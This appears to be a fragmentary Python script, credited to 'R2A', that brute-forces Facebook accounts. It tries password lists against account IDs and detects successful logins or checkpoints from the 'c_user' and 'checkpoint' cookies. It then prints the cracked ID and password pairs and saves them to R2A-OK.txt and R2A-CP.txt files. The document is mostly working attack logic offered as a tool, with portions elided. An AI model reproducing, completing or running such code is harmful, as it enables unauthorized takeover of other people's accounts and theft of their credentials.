...
\33[1;37m----------------------------------------------
 \033[1;32m→   Owner      : MD.ABDUR RAHMAN 
\033[1;33m→   Facebook   :  Md. Abdur Rahman 
\033[1;34m→   Github     :  R2A
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mR2A\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[R2A-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/R2A-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[R2A-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/R2A-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[R2A-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/R2A-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[R2A-OK] '+cid+' | '+ps+'\033[1;32m')
				open('R2A-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[R2A-CP] '+cid+' | '+ps+'\33[0;97m')
				open('R2A-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
...
def zong():
    ...
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=1ky1ZIF165WjWSehdfA_FKaJ; sb=1ky1ZMpomMIfslKP-yYVtqqw',
